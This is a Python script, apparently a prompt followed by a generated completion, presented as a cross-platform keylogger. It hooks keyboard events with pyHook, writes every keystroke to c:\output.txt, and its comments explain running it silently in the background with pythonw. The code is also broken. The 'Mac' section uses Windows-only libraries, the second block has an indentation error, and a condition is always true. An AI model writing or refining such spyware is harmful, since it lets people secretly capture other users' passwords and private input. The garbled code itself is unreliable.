# create a keylogger that can be used in windown and mac
# save the file as keyl.py
# run the file


#keylogger for mac
# import os
# import pyHook
# import pythoncom
# import win32clipboard

import os
import pyHook
import pythoncom
import win32clipboard

# detect the operating system
from sys import platform
if platform == "linux" or platform == "linux2":
    # linux
    print("Linux")
elif platform == "darwin":
    # OS X
    print("Mac")    
elif platform == "win32":
    # Windows
    print("Windows")


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)
    if event.Ascii != 0 or 8:
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

#keylogger for windows
# import os
# import pyHook
# import pythoncom
# import win32clipboard

 def OnKeyboardEvent(event):

    if event.Ascii == 5:
        _exit(1)
    if event.Ascii != 0 or 8:
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

# finish the code
# save the file as keyl.py
# run the file
# open the output.txt file to see the keylogs

# to make the file run in the background
# open the terminal
# type pythonw keyl.py
# press enter
# the file will run in the background
# to stop the file
# open the task manager
# go to the process tab
# find pythonw.exe
# end the process
# the file will stop running








